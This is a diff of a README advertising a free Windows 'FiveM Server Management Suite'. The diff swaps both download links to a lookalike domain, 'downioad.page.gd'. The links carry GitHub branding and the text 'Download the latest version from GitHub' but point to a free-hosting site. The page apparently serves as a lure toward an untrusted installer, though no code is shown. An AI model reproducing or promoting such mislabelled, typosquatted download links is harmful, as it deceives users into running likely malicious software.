@@ -2,7 +2,7 @@
 
 The FiveM Server Management Suite is a powerful and intuitive Windows desktop application tailored for FiveM enthusiasts. Launched in 2026, this free tool provides an all-in-one solution for managing servers, customizing gameplay, and optimizing performance without the need for complex manual setups. Whether you are a server administrator or a player looking to enhance your experience, this suite has everything you need.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Features
 
@@ -56,6 +56,6 @@ A: The application includes an auto-update feature that checks for new versions 
 
 Ready to enhance your FiveM experience? Download the latest version of the FiveM Server Management Suite for 2026:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This free tool is maintained by the community and updated regularly to provide new features and improvements. Last updated: November 2026.
